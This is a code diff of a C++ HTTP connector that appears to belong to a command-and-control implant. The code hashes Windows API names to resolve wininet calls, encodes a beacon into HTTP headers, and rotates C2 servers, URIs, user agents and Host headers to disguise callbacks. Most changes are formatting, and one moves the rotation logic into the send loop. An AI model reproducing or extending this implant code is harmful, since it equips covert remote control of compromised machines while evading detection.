@@ -57,8 +57,8 @@ void ConnectorHTTP::operator delete(void* p) noexcept
 
 ConnectorHTTP::ConnectorHTTP()
 {
-	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC) );
-	
+	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC));
+
 	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
 	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
 	this->functions->LocalFree    = ApiWin->LocalFree;
@@ -81,16 +81,16 @@ ConnectorHTTP::ConnectorHTTP()
 
 	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
 	if (hWininetModule) {
-		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
-		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
-		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
-		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
-		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
-		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
-		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
+		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
+		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
+		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
+		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
+		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
+		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
+		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
 		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
-		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
-		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
+		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
+		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
 	}
 }
 
@@ -99,10 +99,10 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	LPSTR encBeat = b64_encode(beat, beatSize);
 
 	ULONG enc_beat_length = _strlen(encBeat);
-	ULONG param_length    = _strlen((CHAR*) profile.parameter);
-	ULONG headers_length  = _strlen((CHAR*) profile.http_headers);
+	ULONG param_length    = _strlen((CHAR*)profile.parameter);
+	ULONG headers_length  = _strlen((CHAR*)profile.http_headers);
 
-	CHAR* HttpHeaders = (CHAR*) this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
+	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
 	memcpy(HttpHeaders, profile.http_headers, headers_length);
 	ULONG index = headers_length;
 	memcpy(HttpHeaders + index, profile.parameter, param_length);
@@ -121,10 +121,10 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 
 	this->headers        = HttpHeaders;
 	this->server_count   = profile.servers_count;
-	this->server_address = (CHAR**) profile.servers;
+	this->server_address = (CHAR**)profile.servers;
 	this->server_ports   = profile.ports;
 	this->ssl            = profile.use_ssl;
-	this->http_method    = (CHAR*) profile.http_method;
+	this->http_method    = (CHAR*)profile.http_method;
 	this->uri_count      = profile.uri_count;
 	this->uris           = (CHAR**) profile.uris;
 	this->ua_count       = profile.ua_count;
@@ -135,7 +135,7 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	this->ans_size       = profile.ans_size;
 	this->ans_pre_size   = profile.ans_pre_size;
 
-	this->proxy_type = profile.proxy_type;
+	this->proxy_type     = profile.proxy_type;
 	this->proxy_username = (CHAR*)profile.proxy_username;
 	this->proxy_password = (CHAR*)profile.proxy_password;
 
@@ -259,7 +259,7 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						ULONG hhLen = _strlen(currentHH);
 						ULONG baseLen = _strlen(this->headers);
 						// "Host: " (6) + hhLen + "\r\n" (2) + baseLen + null (1)
-						tmpHeaders = (CHAR*) this->functions->LocalAlloc(LPTR, 6 + hhLen + 2 + baseLen + 1);
+						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, 6 + hhLen + 2 + baseLen + 1);
 						ULONG off = 0;
 						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
 						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
@@ -358,22 +358,23 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 
 				this->server_index = (this->server_index + 1) % this->server_count;
 			}
-		}
-	}
 
-	// Rotate indices for next callback (active round-robin)
-	if (this->rotation_mode == 1) {
-		this->uri_index    = GenerateRandom32() % this->uri_count;
-		this->ua_index     = GenerateRandom32() % this->ua_count;
-		this->server_index = GenerateRandom32() % this->server_count;
-		if (this->hh_count > 0)
-			this->hh_index = GenerateRandom32() % this->hh_count;
-	} else {
-		this->uri_index    = (this->uri_index + 1) % this->uri_count;
-		this->ua_index     = (this->ua_index + 1) % this->ua_count;
-		this->server_index = (this->server_index + 1) % this->server_count;
-		if (this->hh_count > 0)
-			this->hh_index = (this->hh_index + 1) % this->hh_count;
+			// Rotate indices for next callback (active round-robin)
+			if (this->rotation_mode == 1) {
+				this->uri_index = GenerateRandom32() % this->uri_count;
+				this->ua_index = GenerateRandom32() % this->ua_count;
+				this->server_index = GenerateRandom32() % this->server_count;
+				if (this->hh_count > 0)
+					this->hh_index = GenerateRandom32() % this->hh_count;
+			}
+			else {
+				this->uri_index = (this->uri_index + 1) % this->uri_count;
+				this->ua_index = (this->ua_index + 1) % this->ua_count;
+				this->server_index = (this->server_index + 1) % this->server_count;
+				if (this->hh_count > 0)
+					this->hh_index = (this->hh_index + 1) % this->hh_count;
+			}
+		}
 	}
 }
 
